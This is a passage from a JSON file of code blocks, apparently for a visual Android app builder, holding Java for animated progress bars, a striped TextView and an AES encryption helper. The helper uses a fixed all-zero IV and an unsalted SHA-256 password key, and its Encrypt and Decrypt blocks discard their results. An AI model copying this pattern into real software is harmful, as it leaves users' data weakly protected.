mPaint4.setAlpha(alpha);\n    }\n\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        mColorFilter \u003d cf;\n        mPaint1.setColorFilter(cf);\n        mPaint2.setColorFilter(cf);\n        mPaint3.setColorFilter(cf);\n        mPaint4.setColorFilter(cf);\n    }\n\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n\n    public static class Builder {\n        private int[] mColors;\n\n        public Builder(Context context){\n            initDefaults(context);\n            return;\n        }\n\t\t\n        private void initDefaults(Context context) {\n            //Default values\n            mColors \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n            return;\n        }\n\t\t\n        public Builder colors(int[] colors) {\n            if (colors \u003d\u003d null || colors.length \u003d\u003d 0) {\n                throw new IllegalArgumentException(\"Your color array must contains at least 4 values\");\n            }\n\n            mColors \u003d colors;\n            return this;\n        }\n\n        public android.graphics.drawable.Drawable build() {\n            return new ChromeFloatingCirclesDrawable(mColors);\n        }\n    }\n}\n{","name":"GoogleProgressLibMoreblock","palette":"92","type":" ","spec":"##GoogleProgressLibMoreblock##"},{"code":"%1$s.setIndeterminateDrawable(new FoldingCirclesDrawable.Builder(this).colors(new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}).build());","name":"GProg : FoldingCircles","palette":"92","type":" ","spec":"%m.progressbar setProgressType : FoldingCircles"},{"code":"%1$s.setIndeterminateDrawable(new NexusRotationCrossDrawable.Builder(this).colors(new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}).build());","name":"GProg : NexusRotationCross","palette":"92","type":" ","spec":"%m.progressbar setProgressType : NexusRotationCross"},{"code":"%1$s.setIndeterminateDrawable(new ChromeFloatingCirclesDrawable.Builder(this).colors(new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}).build());","name":"GProg : ChromeFloatingCircles","palette":"92","type":" ","spec":"%m.progressbar setProgressType : ChromeFloatingCircles"},{"code":"}\npublic static class WP7ProgressBar extends LinearLayout {\r\n    private static final int INTERVAL_DEF \u003d 150;\r\n    private static final int INDICATOR_COUNT_DEF \u003d 5;\r\n    private static final int ANIMATION_DURATION_DEF \u003d 2200;\r\n    private static final int INDICATOR_HEIGHT_DEF \u003d 5;\r\n    private static final int INDICATOR_RADIUS_DEF \u003d 0;\r\n    private int interval;\r\n    private int animationDuration;\r\n    private int indicatorHeight;\r\n    private int indicatorColor;\r\n    private int indicatorRadius;\r\n    private boolean isShowing \u003d false;\r\n    private ArrayList\u003cWP7Indicator\u003e WP7Indicators;\r\n    private Handler handler;\r\n    private int progressBarCount \u003d 0;\r\n    private ObjectAnimator objectAnimator;\r\n    public WP7ProgressBar(Context context) {\r\n        super(context);\r\n        initialize(null);\r\n    }\r\n    public WP7ProgressBar(Context context, AttributeSet attrs) {\r\n        super(context, attrs);\r\n        initialize(attrs);\r\n    }\r\n    public WP7ProgressBar(Context context, AttributeSet attrs, int defStyleAttr) {\r\n        super(context, attrs, defStyleAttr);\r\n        initialize(attrs);\r\n    }\r\n    private void initialize(AttributeSet attrs) {\r\n        this.setGravity(Gravity.CENTER);\r\n        this.setOrientation(HORIZONTAL);\r\n        this.handler \u003d new Handler();\r\n        setAttributes(attrs);\r\n        initializeIndicators();\r\n    }\r\n    private void setAttributes(AttributeSet attributeSet) {\r\n        //TypedArray typedArray \u003d getContext().obtainStyledAttributes(attributeSet, R.styleable.WP7ProgressBar);\r\n        interval \u003d INTERVAL_DEF;\r\n        animationDuration \u003d ANIMATION_DURATION_DEF;\r\n        indicatorHeight \u003d INDICATOR_HEIGHT_DEF;\r\n        indicatorRadius \u003d INDICATOR_RADIUS_DEF;\r\n        indicatorColor \u003d Color.BLUE; //Context.getColor(getContext(), R.color.colorAccent);\r\n        //typedArray.recycle();\r\n    }\r\n    private void showAnimation() {\r\n        for (int i \u003d 0; i \u003c WP7Indicators.size(); i++) {\r\n            WP7Indicators.get(i).startAnim(animationDuration, (5 - i) * interval);\r\n        }\r\n    }\r\n    private void initializeIndicators() {\r\n        this.removeAllViews();\r\n        ArrayList\u003cWP7Indicator\u003e WP7Indicators \u003d new ArrayList\u003c\u003e();\r\n        for (int i \u003d 0; i \u003c INDICATOR_COUNT_DEF; i++) {\r\n            WP7Indicator WP7Indicator \u003d new WP7Indicator(getContext(), indicatorHeight, indicatorColor, indicatorRadius);\r\n            WP7Indicators.add(WP7Indicator);\r\n            this.addView(WP7Indicator);\r\n        }\r\n        this.WP7Indicators \u003d WP7Indicators;\r\n    }\r\n    private void show() {\r\n        if (isShowing)\r\n            return;\r\n        isShowing \u003d true;\r\n        showAnimation();\r\n    }\r\n    private void hide() {\r\n        clearIndicatorsAnimations();\r\n        isShowing \u003d false;\r\n    }\r\n    private void startWholeViewAnimation() {\r\n        objectAnimator \u003d ObjectAnimator.ofFloat(this, \"translationX\", -200, 200);\r\n        objectAnimator.setInterpolator(new LinearInterpolator());\r\n        objectAnimator.setDuration(animationDuration + (5 * interval));\r\n        objectAnimator.setRepeatMode(ValueAnimator.RESTART);\r\n        objectAnimator.setRepeatCount(ValueAnimator.INFINITE);\r\n        objectAnimator.start();\r\n    }\r\n    private void hideWholeViewAnimation() {\r\n        objectAnimator.removeAllListeners();\r\n        objectAnimator.cancel();\r\n        objectAnimator.end();\r\n    }\r\n    private void clearIndicatorsAnimations() {\r\n        for (WP7Indicator WP7Indicator : WP7Indicators) {\r\n            WP7Indicator.removeAnim();\r\n        }\r\n    }\r\n    public void showProgressBar() {\r\n        progressBarCount++;\r\n        if (progressBarCount \u003d\u003d 1) {\r\n            handler.post(new Runnable() {\r\n                @Override\r\n                public void run() {\r\n                    WP7ProgressBar.this.show();\r\n                }\r\n            });\r\n        }\r\n    }\r\n    public void hideProgressBar() {\r\n        progressBarCount--;\r\n        handler.postDelayed(new Runnable() {\r\n            @Override\r\n            public void run() {\r\n                if (progressBarCount \u003d\u003d 0) {\r\n                    WP7ProgressBar.this.hide();\r\n                }\r\n            }\r\n        }, 50);\r\n    }\r\n    public void setInterval(int interval) {\r\n        this.interval \u003d interval;\r\n        initializeIndicators();\r\n    }\r\n    public void setAnimationDuration(int animationDuration) {\r\n        this.animationDuration \u003d animationDuration;\r\n        initializeIndicators();\r\n    }\r\n    public void setIndicatorHeight(int indicatorHeight) {\r\n        this.indicatorHeight \u003d indicatorHeight;\r\n        initializeIndicators();\r\n    }\r\n    public void setIndicatorColor(int indicatorColor) {\r\n        this.indicatorColor \u003d indicatorColor;\r\n        initializeIndicators();\r\n    }\r\n    public void setIndicatorRadius(int indicatorRadius) {\r\n        this.indicatorRadius \u003d indicatorRadius;\r\n        initializeIndicators();\r\n    }\r\n}\r\n\r\npublic static class WP10ProgressBar extends RelativeLayout {\r\n    private static final int INTERVAL_DEF \u003d 150;\r\n    private static final int INDICATOR_COUNT_DEF \u003d 5;\r\n    private static final int ANIMATION_DURATION_DEF \u003d 1800;\r\n    private static final int INDICATOR_HEIGHT_DEF \u003d 7;\r\n    private static final int INDICATOR_RADIUS_DEF \u003d 0;\r\n    private int interval;\r\n    private int animationDuration;\r\n    private int indicatorHeight;\r\n    private int indicatorColor;\r\n    private int indicatorRadius;\r\n    private boolean isShowing \u003d false;\r\n    private ArrayList\u003cWP10Indicator\u003e wp10Indicators;\r\n    private Handler handler;\r\n    private int progressBarCount \u003d 0;\r\n    public WP10ProgressBar(Context context) {\r\n        super(context);\r\n        initialize(null);\r\n    }\r\n    public WP10ProgressBar(Context context, AttributeSet attrs) {\r\n        super(context, attrs);\r\n        initialize(attrs);\r\n    }\r\n    public WP10ProgressBar(Context context, AttributeSet attrs, int defStyleAttr) {\r\n        super(context, attrs, defStyleAttr);\r\n        initialize(attrs);\r\n    }\r\n    private void initialize(AttributeSet attrs) {\r\n        this.setGravity(Gravity.CENTER);\r\n        this.handler \u003d new Handler();\r\n        this.setRotation(-25);\r\n        setAttributes(attrs);\r\n        initializeIndicators();\r\n    }\r\n    private void setAttributes(AttributeSet attributeSet) {\r\n        //TypedArray typedArray \u003d getContext().obtainStyledAttributes(attributeSet, R.styleable.WP10ProgressBar);\r\n        interval \u003d INTERVAL_DEF;\r\n        animationDuration \u003d ANIMATION_DURATION_DEF;\r\n        indicatorHeight \u003d INDICATOR_HEIGHT_DEF;\r\n        indicatorRadius \u003d INDICATOR_RADIUS_DEF;\r\n        indicatorColor \u003d Color.BLUE;\r\n    }\r\n    private void showAnimation() {\r\n        for (int i \u003d 0; i \u003c wp10Indicators.size(); i++) {\r\n            wp10Indicators.get(i).startAnim(animationDuration, (5 - i) * interval);\r\n        }\r\n    }\r\n    private void initializeIndicators() {\r\n        this.removeAllViews();\r\n        ArrayList\u003cWP10Indicator\u003e WP10Indicators \u003d new ArrayList\u003c\u003e();\r\n        for (int i \u003d 0; i \u003c INDICATOR_COUNT_DEF; i++) {\r\n            WP10Indicator wp10Indicator \u003d new WP10Indicator(getContext(), indicatorHeight, indicatorColor, indicatorRadius, i);\r\n            WP10Indicators.add(wp10Indicator);\r\n            this.addView(wp10Indicator);\r\n        }\r\n        this.wp10Indicators \u003d WP10Indicators;\r\n    }\r\n    private void show() {\r\n        if (isShowing)\r\n            return;\r\n        isShowing \u003d true;\r\n        showAnimation();\r\n    }\r\n    private void hide() {\r\n        clearIndicatorsAnimations();\r\n        isShowing \u003d false;\r\n    }\r\n    private void clearIndicatorsAnimations() {\r\n        for (WP10Indicator wp10Indicator : wp10Indicators) {\r\n            wp10Indicator.removeAnim();\r\n        }\r\n    }\r\n    public void showProgressBar() {\r\n        progressBarCount++;\r\n        if (progressBarCount \u003d\u003d 1) {\r\n            handler.post(new Runnable() {\r\n                @Override\r\n                public void run() {\r\n                    WP10ProgressBar.this.show();\r\n                }\r\n            });\r\n        }\r\n    }\r\n    public void hideProgressBar() {\r\n        progressBarCount--;\r\n        handler.postDelayed(new Runnable() {\r\n            @Override\r\n            public void run() {\r\n                if (progressBarCount \u003d\u003d 0) {\r\n                    WP10ProgressBar.this.hide();\r\n                }\r\n            }\r\n        }, 50);\r\n    }\r\n    public void setInterval(int interval) {\r\n        this.interval \u003d interval;\r\n        initializeIndicators();\r\n    }\r\n    public void setAnimationDuration(int animationDuration) {\r\n        this.animationDuration \u003d animationDuration;\r\n        initializeIndicators();\r\n    }\r\n    public void setIndicatorHeight(int indicatorHeight) {\r\n        this.indicatorHeight \u003d indicatorHeight;\r\n        initializeIndicators();\r\n    }\r\n    public void setIndicatorColor(int indicatorColor) {\r\n        this.indicatorColor \u003d indicatorColor;\r\n        initializeIndicators();\r\n    }\r\n    public void setIndicatorRadius(int indicatorRadius) {\r\n        this.indicatorRadius \u003d indicatorRadius;\r\n        initializeIndicators();\r\n    }\r\n}\r\n\r\n\r\npublic static class Base10Indicator extends View {\r\n    private int color;\r\n    public Base10Indicator(Context context, int indicatorHeight, int color, int radius) {\r\n        super(context);\r\n        this.color \u003d color;\r\n        initialize(indicatorHeight, radius);\r\n    }\r\n    private void initialize(int indicatorHeight, int radius) {\r\n        this.setBackground(getCube(radius));\r\n        LinearLayout.LayoutParams layoutParams \u003d new LinearLayout.LayoutParams(Utils.px2dp(getContext(), indicatorHeight), Utils.px2dp(getContext(), indicatorHeight));\r\n        this.setLayoutParams(layoutParams);\r\n    }\r\n    private android.graphics.drawable.GradientDrawable getCube(int radius) {\r\n        android.graphics.drawable.GradientDrawable drawable \u003d new android.graphics.drawable.GradientDrawable();\r\n        drawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);\r\n        drawable.setColor(color);\r\n        drawable.setCornerRadius(Utils.px2dp(getContext(), radius));\r\n        return drawable;\r\n    }\r\n}\r\n\r\npublic static class Utils {\r\n    public static int px2dp(Context context, int px) {\r\n        float scale \u003d context.getResources().getDisplayMetrics().density;\r\n        return (int) (px * scale + 0.5f);\r\n    }\r\n}\r\n\r\nstatic class WP7Indicator extends View {\r\n    private ObjectAnimator objectAnimator;\r\n    private int color;\r\n    public WP7Indicator(Context context, int indicatorHeight, int color, int radius) {\r\n        super(context);\r\n        this.color \u003d color;\r\n        initialize(indicatorHeight, radius);\r\n    }\r\n    private void initialize(int indicatorHeight, int radius) {\r\n        this.setBackground(getCube(radius));\r\n        LinearLayout.LayoutParams layoutParams \u003d new LinearLayout.LayoutParams(Utils.px2dp(getContext(), indicatorHeight), Utils.px2dp(getContext(), indicatorHeight));\r\n        layoutParams.rightMargin \u003d Utils.px2dp(getContext(), (int) (1.5f * indicatorHeight));\r\n        this.setLayoutParams(layoutParams);\r\n        startAnim(0, 0);\r\n        removeAnim();\r\n    }\r\n    private android.graphics.drawable.GradientDrawable getCube(int radius) {\r\n        android.graphics.drawable.GradientDrawable drawable \u003d new android.graphics.drawable.GradientDrawable();\r\n        drawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);\r\n        drawable.setColor(color);\r\n        drawable.setCornerRadius(Utils.px2dp(getContext(), radius));\r\n        return drawable;\r\n    }\r\n    public void startAnim(long animationDuration, long delay) {\r\n        objectAnimator \u003d ObjectAnimator.ofFloat(this, \"translationX\", +1000, -1000);\r\n        objectAnimator.setInterpolator(new WPInterpolator());\r\n        objectAnimator.setDuration(animationDuration);\r\n        objectAnimator.setRepeatMode(ValueAnimator.RESTART);\r\n        objectAnimator.setRepeatCount(ValueAnimator.INFINITE);\r\n        objectAnimator.setStartDelay(delay);\r\n        objectAnimator.start();\r\n    }\r\n    public void removeAnim() {\r\n        objectAnimator.removeAllListeners();\r\n        objectAnimator.cancel();\r\n        objectAnimator.end();\r\n    }\r\n}\r\n\r\npublic static class WP10Indicator extends RelativeLayout {\r\n    private Base10Indicator base10Indicator;\r\n    private ObjectAnimator objectAnimator;\r\n    private int number;\r\n    public WP10Indicator(Context context, int indicatorHeight, int color, int radius, int number) {\r\n        super(context);\r\n        initialize(indicatorHeight, color, radius, number);\r\n    }\r\n    private void initialize(int indicatorHeight, int color, int radius, int number) {\r\n        this.number \u003d number;\r\n        this.base10Indicator \u003d new Base10Indicator(getContext(), indicatorHeight, color, radius);\r\n        RelativeLayout.LayoutParams layoutParams \u003d new LayoutParams(Utils.px2dp(getContext(), indicatorHeight * 8),\r\n                Utils.px2dp(getContext(), indicatorHeight * 8));\r\n        this.setLayoutParams(layoutParams);\r\n        this.setGravity(Gravity.CENTER_VERTICAL | Gravity.RIGHT);\r\n        this.addView(base10Indicator);\r\n        startAnim(0, 0);\r\n        removeAnim();\r\n        this.setAlpha(0f);\r\n    }\r\n    public void startAnim(final long animationDuration, final long delay) {\r\n        objectAnimator \u003d ObjectAnimator.ofFloat(this, \"rotation\", (number * 15), -360 + (number * 15));\r\n        objectAnimator.setInterpolator(new WPInterpolator());\r\n        objectAnimator.setDuration(animationDuration);\r\n        objectAnimator.setRepeatMode(ValueAnimator.RESTART);\r\n        objectAnimator.setRepeatCount(2);\r\n        objectAnimator.addListener(new android.animation.Animator.AnimatorListener() {\r\n            @Override\r\n            public void onAnimationStart(android.animation.Animator animator) {\r\n                WP10Indicator.this.setAlpha(1f);\r\n                startAlphaAnimation(animationDuration);\r\n            }\r\n            @Override\r\n            public void onAnimationEnd(android.animation.Animator animator) {\r\n                removeAnim();\r\n                startAnim(animationDuration, 0);\r\n            }\r\n            @Override\r\n            public void onAnimationCancel(android.animation.Animator animator) {\r\n            }\r\n            @Override\r\n            public void onAnimationRepeat(android.animation.Animator animator) {\r\n            }\r\n        });\r\n        objectAnimator.setStartDelay(delay);\r\n        objectAnimator.start();\r\n    }\r\n    public void startAlphaAnimation(long animationDuration) {\r\n        this.animate().alpha(0).setDuration(animationDuration / 12).setStartDelay(2 * animationDuration);\r\n    }\r\n    public void removeAnim() {\r\n        this.animate().alpha(0f).setDuration(0).setStartDelay(0);\r\n        objectAnimator.removeAllListeners();\r\n        objectAnimator.cancel();\r\n        objectAnimator.end();\r\n    }\r\n}\r\n\r\npublic static class WPInterpolator implements android.view.animation.Interpolator {\r\n    @Override\r\n    public float getInterpolation(float v) {\r\n        if (v \u003e 0.3f \u0026\u0026 v \u003c 0.70f)\r\n            return (float) ((-(v - 0.5) / 6) + 0.5f);\r\n        return (float) ((-4) * Math.pow(v - 0.5, 3) + 0.5);\r\n    }\r\n}\n{","name":"WindowsProgressLib","palette":"93","type":" ","spec":"##WindowsProgressLibMoreblock##"},{"code":"WP7ProgressBar %2$s \u003d new WP7ProgressBar(this);\r\n%2$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.WRAP_CONTENT));\r\n%1$s.addView(%2$s);","name":"CreateWin7","palette":"93","type":" ","spec":"%m.view Create Win7 Progress ID %s.inputOnly"},{"code":"WP10ProgressBar %2$s \u003d new WP10ProgressBar(this);\r\n%2$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT,LinearLayout.LayoutParams.WRAP_CONTENT));\r\n%1$s.addView(%2$s);","name":"CreateWin10","palette":"93","type":" ","spec":"%m.view Create Win10 Progress ID %s.inputOnly"},{"code":"%1$s.showProgressBar();","name":"WinProgress show","palette":"93","type":" ","spec":"WinProgress %s.inputOnly show"},{"code":"%1$s.hideProgressBar();","name":"WinProgress hide","palette":"93","type":" ","spec":"WinProgress %s.inputOnly hide"},{"code":"}\npublic static final class AESCrypt {\r\n    private static final String TAG \u003d \"AESCrypt\";\r\n    private static final String AES_MODE \u003d \"AES/CBC/PKCS7Padding\";\r\n    private static final String CHARSET \u003d \"UTF-8\";\r\n    private static final String HASH_ALGORITHM \u003d \"SHA-256\";\r\n    private static final byte[] ivBytes \u003d {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\r\n    public static boolean DEBUG_LOG_ENABLED \u003d false;\r\n    private static javax.crypto.spec.SecretKeySpec generateKey(final String password) throws java.security.NoSuchAlgorithmException, java.io.UnsupportedEncodingException {\r\n        final java.security.MessageDigest digest \u003d java.security.MessageDigest.getInstance(HASH_ALGORITHM);\r\n        byte[] bytes \u003d password.getBytes(\"UTF-8\");\r\n        digest.update(bytes, 0, bytes.length);\r\n        byte[] key \u003d digest.digest();\r\n        log(\"SHA-256 key \", key);\r\n        javax.crypto.spec.SecretKeySpec secretKeySpec \u003d new javax.crypto.spec.SecretKeySpec(key, \"AES\");\r\n        return secretKeySpec;\r\n    }\r\n    public static String encrypt(final String password, String message)\r\n            throws java.security.GeneralSecurityException {\r\n        try {\r\n            final javax.crypto.spec.SecretKeySpec key \u003d generateKey(password);\r\n            log(\"message\", message);\r\n            byte[] cipherText \u003d encrypt(key, ivBytes, message.getBytes(CHARSET));\r\n            String encoded \u003d android.util.Base64.encodeToString(cipherText, android.util.Base64.NO_WRAP);\r\n            log(\"Base64.NO_WRAP\", encoded);\r\n            return encoded;\r\n        } catch (java.io.UnsupportedEncodingException e) {\r\n            if (DEBUG_LOG_ENABLED)\r\n                android.util.Log.e(TAG, \"UnsupportedEncodingException \", e);\r\n            throw new java.security.GeneralSecurityException(e);\r\n        }\r\n    }\r\n    public static byte[] encrypt(final javax.crypto.spec.SecretKeySpec key, final byte[] iv, final byte[] message)\r\n            throws java.security.GeneralSecurityException {\r\n        final javax.crypto.Cipher cipher \u003d javax.crypto.Cipher.getInstance(AES_MODE);\r\n        javax.crypto.spec.IvParameterSpec ivSpec \u003d new javax.crypto.spec.IvParameterSpec(iv);\r\n        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, key, ivSpec);\r\n        byte[] cipherText \u003d cipher.doFinal(message);\r\n        log(\"cipherText\", cipherText);\r\n        return cipherText;\r\n    }\r\n    public static String decrypt(final String password, String base64EncodedCipherText)\r\n            throws java.security.GeneralSecurityException {\r\n        try {\r\n            final javax.crypto.spec.SecretKeySpec key \u003d generateKey(password);\r\n            log(\"base64EncodedCipherText\", base64EncodedCipherText);\r\n            byte[] decodedCipherText \u003d android.util.Base64.decode(base64EncodedCipherText, android.util.Base64.NO_WRAP);\r\n            log(\"decodedCipherText\", decodedCipherText);\r\n            byte[] decryptedBytes \u003d decrypt(key, ivBytes, decodedCipherText);\r\n            log(\"decryptedBytes\", decryptedBytes);\r\n            String message \u003d new String(decryptedBytes, CHARSET);\r\n            log(\"message\", message);\r\n            return message;\r\n        } catch (java.io.UnsupportedEncodingException e) {\r\n            if (DEBUG_LOG_ENABLED)\r\n                android.util.Log.e(TAG, \"UnsupportedEncodingException \", e);\r\n            throw new java.security.GeneralSecurityException(e);\r\n        }\r\n    }\r\n    public static byte[] decrypt(final javax.crypto.spec.SecretKeySpec key, final byte[] iv, final byte[] decodedCipherText)\r\n            throws java.security.GeneralSecurityException {\r\n            final javax.crypto.Cipher cipher \u003d javax.crypto.Cipher.getInstance(AES_MODE);\r\n            javax.crypto.spec.IvParameterSpec ivSpec \u003d new javax.crypto.spec.IvParameterSpec(iv);\r\n            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, key, ivSpec);\r\n            byte[] decryptedBytes \u003d cipher.doFinal(decodedCipherText);\r\n            log(\"decryptedBytes\", decryptedBytes);\r\n            return decryptedBytes;\r\n    }\r\n    private static void log(String what, byte[] bytes) {\r\n        if (DEBUG_LOG_ENABLED)\r\n            android.util.Log.d(TAG, what + \"[\" + bytes.length + \"] [\" + bytesToHex(bytes) + \"]\");\r\n    }\r\n    private static void log(String what, String value) {\r\n        if (DEBUG_LOG_ENABLED)\r\n            android.util.Log.d(TAG, what + \"[\" + value.length() + \"] [\" + value + \"]\");\r\n    }\r\n    private static String bytesToHex(byte[] bytes) {\r\n        final char[] hexArray \u003d {\u00270\u0027, \u00271\u0027, \u00272\u0027, \u00273\u0027, \u00274\u0027, \u00275\u0027, \u00276\u0027, \u00277\u0027, \u00278\u0027,\r\n                \u00279\u0027, \u0027A\u0027, \u0027B\u0027, \u0027C\u0027, \u0027D\u0027, \u0027E\u0027, \u0027F\u0027};\r\n        char[] hexChars \u003d new char[bytes.length * 2];\r\n        int v;\r\n        for (int j \u003d 0; j \u003c bytes.length; j++) {\r\n            v \u003d bytes[j] \u0026 0xFF;\r\n            hexChars[j * 2] \u003d hexArray[v \u003e\u003e\u003e 4];\r\n            hexChars[j * 2 + 1] \u003d hexArray[v \u0026 0x0F];\r\n        }\r\n        return new String(hexChars);\r\n    }\r\n    private AESCrypt() {\r\n    }\r\n}\n{","name":"AESCryptLib","palette":"94","type":" ","spec":"##AES Crypt Lib (add to Mblock)##"},{"code":"final String pass_key \u003d %1$s;\r\nfinal String texts \u003d %2$s;\r\ntry {\r\n\tAESCrypt.encrypt(pass_key, texts);\r\n}catch (java.security.GeneralSecurityException e){\r\n}","name":"Encrypt","palette":"94","type":"s","spec":"Encrypt key %s and text %s"},{"code":"String pass_key \u003d %1$s;\r\nString crypted_texts \u003d %2$s;\r\ntry {\r\n\tAESCrypt.decrypt(pass_key, crypted_texts);\r\n} catch (java.security.GeneralSecurityException e){\r\n}","name":"Decrypt","palette":"94","type":"s","spec":"Decrypt key %s and text %s"},{"code":"}\npublic static class ZebraTextView extends TextView {\r\n    private int evenColor;\r\n    private int oddColor;\r\n    private Rect r;\r\n    public ZebraTextView(Context context) {\r\n        super(context);\r\n        init(null);\r\n    }\r\n    public ZebraTextView(Context context, AttributeSet attrs) {\r\n        super(context, attrs);\r\n        init(attrs);\r\n    }\r\n    public ZebraTextView(Context context, AttributeSet attrs, int defStyleAttr) {\r\n        super(context, attrs, defStyleAttr);\r\n        init(attrs);\r\n    }\r\n    private void init(AttributeSet attrs) {\r\n        setEvenLineColor(Color.TRANSPARENT);\r\n        setOddLineColor(Color.parseColor(\"#77E3EDCD\"));\r\n        r \u003d new Rect();\r\n    }\r\n    public void setEvenLineColor(int color) {\r\n        this.evenColor \u003d color;\r\n        postInvalidate();\r\n    }\r\n    public void setOddLineColor(int color) {\r\n        this.oddColor \u003d color;\r\n        postInvalidate();\r\n    }\r\n    @Override\r\n    protected void onDraw(Canvas canvas) {\r\n        Layout layout \u003d getLayout();\r\n        for (int i \u003d 0; i \u003c layout.getLineCount(); i++) {\r\n            layout.getLineBounds(i, r);\r\n            getPaint().setColor(i % 2 \u003d\u003d 0 ? oddColor : evenColor);\r\n            r.left \u003d getPaddingLeft();\r\n            r.right \u003d getMeasuredWidth() - getPaddingRight();\r\n            canvas.drawRect(r, getPaint());\r\n        }\r\n        super.onDraw(canvas);\r\n    }\r\n}\r\n{","name":"ZebraLib","palette":"95","type":" ","spec":"##ZebraLib (add to Mblock)##"},{"code":"ZebraTextView %1$s \u003d new ZebraTextView(this);\r\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));\r\n%1$s.setText(%2$s);\r\n%1$s.setTextSize(20);\r\n%1$s.setEvenLineColor(Color.parseColor(\"#FF0000\"));\r\n%1$s.setOddLineColor(Color.parseColor(\"#00FF00\"));\r\n%3$s.addView(%1$s);","name":"ZebraTextView","palette":"95","type":" ","spec":"ZebraTextView ID %s.inputOnly text %s add to %m.view"},{"code":"\r}\npublic static class SuccessView extends View {\r\n    private float mDensity \u003d -1;\r\n    private Paint mPaint, nPaint;\r\n    private float minWidth;\r\n    private float minHeight;\r\n    private float angle, startAngle \u003d -90;\r\n    private final float CONST_RADIUS \u003d dip2px(1.2f);\r\n    private final float CONST_RECT_WEIGHT \u003d dip2px(3);\r\n    private final float CONST_LEFT_RECT_W \u003d dip2px(15);\r\n    private final float CONST_RIGHT_RECT_W \u003d dip2px(25);\r\n    private float mLeftRectWidth \u003d 0;\r\n    private float mRightRectWidth \u003d 0;\r\n    private int pColor \u003d 0xffA5DC86;\r\n    private float strokeWidth \u003d 2.5f;\r\n    public SuccessView(Context context) {\r\n        this(context, null);\r\n    }\r\n    public SuccessView(Context context, AttributeSet attrs) {\r\n        this(context, attrs, 0);\r\n    }\r\n    public SuccessView(Context context, AttributeSet attrs, int defStyleAttr) {\r\n        super(context, attrs, defStyleAttr);\r\n        init(attrs);\r\n    }\r\n    private void init(AttributeSet attrs) {\r\n        minWidth \u003d dip2px(50);\r\n        minHeight \u003d dip2px(50);\r\n        mPaint \u003d new Paint();\r\n        mPaint.setColor(pColor);\r\n        mPaint.setStyle(Paint.Style.FILL_AND_STROKE);\r\n        mPaint.setStrokeWidth(0.8f);\r\n        mPaint.setAntiAlias(true);\r\n        nPaint \u003d new Paint();\r\n        nPaint.setAntiAlias(true);\r\n        nPaint.setStyle(Paint.Style.STROKE);\r\n        nPaint.setStrokeWidth(dip2px(strokeWidth));\r\n        nPaint.setColor(pColor);\r\n    }\r\n\tpublic void setColor(int color) {\r\n\t\tminWidth \u003d dip2px(50);\r\n        minHeight \u003d dip2px(50);\r\n        mPaint \u003d new Paint();\r\n        mPaint.setColor(color);\r\n        mPaint.setStyle(Paint.Style.FILL_AND_STROKE);\r\n        mPaint.setStrokeWidth(0.8f);\r\n        mPaint.setAntiAlias(true);\r\n        nPaint \u003d new Paint();\r\n        nPaint.setAntiAlias(true);\r\n        nPaint.setStyle(Paint.Style.STROKE);\r\n        nPaint.setStrokeWidth(dip2px(strokeWidth));\r\n        nPaint.setColor(color);\r\n\t}\r\n\tpublic void setStrokeWidth(float stroke) {\r\n\t\tminWidth \u003d dip2px(50);\r\n        minHeight \u003d dip2px(50);\r\n        mPaint \u003d new Paint();\r\n        mPaint.setColor(pColor);\r\n        mPaint.setStyle(Paint.Style.FILL_AND_STROKE);\r\n        mPaint.setStrokeWidth(0.8f);\r\n        mPaint.setAntiAlias(true);\r\n        nPaint \u003d new Paint();\r\n        nPaint.setAntiAlias(true);\r\n        nPaint.setStyle(Paint.Style.STROKE);\r\n        nPaint.setStrokeWidth(dip2px(stroke));\r\n        nPaint.setColor(pColor);\r\n\t}\r\n    @Override\r\n    protected void onDraw(Canvas canvas) {\r\n        Rect bounds \u003d canvas.getClipBounds();\r\n        float left, right, top, bottom;\r\n        if (bounds.width() \u003e bounds.height()) {\r\n            float distance \u003d (bounds.width() / 2 - bounds.height() / 2);\r\n            left \u003d bounds.left + distance;\r\n            right \u003d bounds.right - distance;\r\n            top \u003d bounds.top;\r\n            bottom \u003d bounds.bottom;\r\n        } else if (bounds.width() \u003c bounds.height()) {\r\n            float distance \u003d (bounds.height() / 2 - bounds.width() / 2);\r\n            top \u003d bounds.top + distance;\r\n            bottom \u003d bounds.bottom - distance;\r\n            left \u003d bounds.left;\r\n            right \u003d bounds.right;\r\n        } else {\r\n            left \u003d bounds.left;\r\n            right \u003d bounds.right;\r\n            top \u003d bounds.top;\r\n            bottom \u003d bounds.bottom;\r\n        }\r\n        RectF oval \u003d new RectF(left + dip2px(2f), top + dip2px(2f), right - dip2px(2f), bottom - dip2px(2f));\r\n        canvas.drawArc(oval, startAngle, angle, false, nPaint);\r\n        int totalW \u003d getWidth();\r\n        int totalH \u003d getHeight();\r\n        canvas.rotate(45, totalW / 2, totalH / 2);\r\n        totalW /\u003d 1.2;\r\n        totalH /\u003d 1.4;\r\n        